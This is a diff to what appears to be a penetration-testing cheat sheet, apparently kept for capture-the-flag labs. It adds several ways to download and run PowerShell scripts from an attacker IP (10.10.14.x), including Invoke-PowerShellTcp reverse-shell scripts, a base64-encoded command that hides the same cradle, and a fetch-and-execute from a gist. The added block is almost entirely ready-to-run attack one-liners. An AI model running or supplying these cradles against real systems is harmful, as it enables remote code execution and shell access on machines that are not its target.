@@ -56,6 +56,9 @@ Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http
 [Environment]::Is64BitOperatingSystem
 [Environment]::Is64BitProcess
 
+# Option 1
+start /b powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp2.ps1');
+# Option 2
 start /b c:\Windows\SysNative\WindowsPowerShell\v1.0\powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp3.ps1');
 
 
@@ -71,8 +74,20 @@ sudo impacket-smbserver smbFolder $(pwd) -smb2support
 ==============================================================================
 [+] Transfer files WEB Powershell
 ==============================================================================
+# Option 1
 powershell.exe  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp2.ps1');
+
+# Option 2
 powershell.exe  IEX (IWR http://10.10.14.28/PowerShellTcp.ps1 -UseBasicParsing)
+
+# Option 3
+# On Linux encode in base64
+echo "IEX (IWR http://10.10.14.20:8000/Invoke-PowerShellTcp2.ps1 -UseBasicParsing)" | iconv -t utf-16le |base64 -w 0
+# Encoded Command
+cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADAAOgA4ADAAMAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwADIALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="
+
+# Option 4
+(New-Object Net.Webclient).DownloadFile('https://gist.githubusercontent.com/Heirhabarov/69105374b08b12ab10f215b0923119d2/raw/45896b2561cc9c577378a630817078fbcd0588f4/TestPSScript.ps1','testdata'); IEX (Get-Content '.\testdata' -raw)
 
 ==============================================================================
 [+] Transfer files Certutil
